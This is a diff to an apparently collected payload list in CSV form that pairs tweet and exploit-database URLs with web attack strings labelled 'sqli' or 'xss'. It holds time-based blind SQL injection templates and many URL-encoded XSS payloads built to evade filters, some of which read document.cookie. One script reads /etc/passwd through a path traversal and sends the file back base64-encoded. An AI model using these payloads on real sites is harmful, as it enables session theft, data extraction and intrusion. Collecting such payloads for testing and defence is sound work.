@@ -496,3 +496,24 @@ https://twitter.com/RootMoksha/status/1770379210705838114,&#34;&gt;&lt;track/one
 https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_source=rss&utm_medium=rss&utm_campaign=rss,SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}'))={i} THEN sleep(3) ELSE sleep(0) END,sqli
 https://vulners.com/githubexploit/8292EFB2-7D48-5269-85E0-90F582B0CF95?utm_source=rss&utm_medium=rss&utm_campaign=rss,SELECT CASE WHEN LENGTH((SELECT GROUP_CONCAT({column_name}) FROM {from_where} where table_schema = '{where}' and table_name = '{where2}'))={i} THEN sleep(3) ELSE sleep(0) END,sqli
 https://vulners.com/githubexploit/7A6411F4-C896-52AB-9725-D10DEBF9CD0F?utm_source=rss&utm_medium=rss&utm_campaign=rss,clicks%60%3DIF%28SUBSTRING%28version%28%29%2C1%2C1%29%3D5%2CSLEEP%2810%29%2Cnull%29--%20-,sqli
+https://twitter.com/TakSec/status/1786074467728515132, 1%27%22%26gt%3B%26lt%3BA%20HRef%3D%5C%22%20AutoFocus%20OnFocus%3Dtop%2F%2A%2A%2F%3F.%5B%27ale%27%252B%27rt%27%5D%281%29%26gt%3B,xss
+https://twitter.com/KN0X55/status/1786022967933046971,%20%3CA%20HRef%3D%5C%22%20AutoFocus%20OnFocus%3Dtop%2F%2A%2A%2F%3F.%5B%27al%27%252B%27ert%27%5D%281%29%3E,xss
+https://twitter.com/PrinceOker79109/status/1786548416010498123, %3CImg%20Src%3DOnXSS%20OnError%3Dconfirm%28%22Hacked_by_a7madn1%22%29%3E,xss
+https://twitter.com/XssPayloads/status/1788748656390058340, %26lt%3Bfoo%2520bar%3D%25250a%2520onclick%3D%26lt%3Byour%20js%20code%26gt,xss
+https://twitter.com/Dharamveer_____/status/1788492033675440375, %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E,xss
+https://twitter.com/Dharamveer_____/status/1788492033675440375,%20%60%22%2F%2F%3E%3Cscript%3Ealert%28%29%3C%2Fscript%3E,xss
+https://twitter.com/its_Loksh_P/status/1792006779783848407, alert%20%3D%20window%5B%22al%22%2B%22ert%22%5D,xss
+https://twitter.com/Sharo_k_h/status/1792235995154514276,%20%3Cdetails%20x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2%20open%20ontoggle%3D%26%23x0000000000061%3Blert%26%23x000000028%3Borigin%26%23x000029%3B%3E,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%3Csvg%20onload%3Dalert%26%230000000040document.cookie%3E%20%3Csvg%2FoNLY%3D1%2F%2A%2A%2FOn%2BONLoaD%3Dco%5Cu006efirm%26%5C%23x28%3B%5C%23x29%3B%3E,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%26lt%3Bsvg%2FoNLY%253d1%2F%2A%2A%2FOn%2BONLoaD%253dco%5Cu006efirm%2526%2523x28%253b%2526%2523x29%253b%26gt%3B,xss
+https://twitter.com/0xRAYAN7/status/1793217107544424474,%20%26lt%3BSvg%20Only%3D1%20OnLoad%3Dconfirm%28atob%28%22Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ%3D%3D%22%29%29%26gt%3B,xss
+https://vulners.com/githubexploit/C99986A2-7B57-5939-9BD1-AA95A6572AF3?utm_source=rss&utm_medium=rss&utm_campaign=rss, ;echo 1337; die;,xss
+https://twitter.com/t0t3kingpad4/status/1800833416491049416,%20%22%2F%26gt%3B%26lt%3B%E2%80%8B%2Fscript%26gt%3B%26lt%3B%E2%80%8Bscript%26gt%3Balert%28document.domain%29%26lt%3B%E2%80%8B%2Fscript%26gt%3B,xss
+https://twitter.com/cyber_advising/status/1804119011086549017,%20%3Cscript%3Efetch%28%27%2Fjson_api.php%3Fquery%5B%5D%3D..%2Fetc%2Fpasswd%27%29.then%28r%20%3D%3E%20r.text%28%29%29.then%28t%20%3D%3E%20fetch%28%27%2Fjson_api.php%3Fquery%5B%5D%3D..%2Frspamd_custom_maps%2F%27%2Bbtoa%28t%29%29%29%3C%2Fscript%3E,xss
+https://twitter.com/RootMoksha/status/1804523003235225830,%20%3Cdetails%20x%3Dxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx%3A2%20open%20ontoggle%3D%22prompt%28document.cookie%29%3B%22%3E,xss
+https://twitter.com/RootMoksha/status/1804523003235225830,%20%3Csvg%2Fonload%3Dalert%2F%2A1337%2A%2F%281%29%3E,xss
+https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%2F%2F%26amp%3BNewLine%3B%282%29%26gt%3B,xss
+https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%26amp%3Bsol%3B%2A%2A%26amp%3Bsol%3B%283%29%26gt%3B,xss
+https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%2F%26amp%3B%2342%3B%26amp%3B%2342%3B%2F%284%29%26gt%3B,xss
+https://twitter.com/RootMoksha/status/1804523003235225830,%20%26lt%3Bsvg%2Fonload%3Dalert%26amp%3B%23x2F%3B%2A%2A%26amp%3B%2347%3B%285%29%26gt%3B,xss
+https://twitter.com/XssPayloads/status/1805805676662255918,%20%3Cimg%20hrEF%3D%22x%22%20sRC%3D%22data%3Ax%22%20oNLy%3D1%20oNErrOR%3Dprompt%601%60%3E,xss
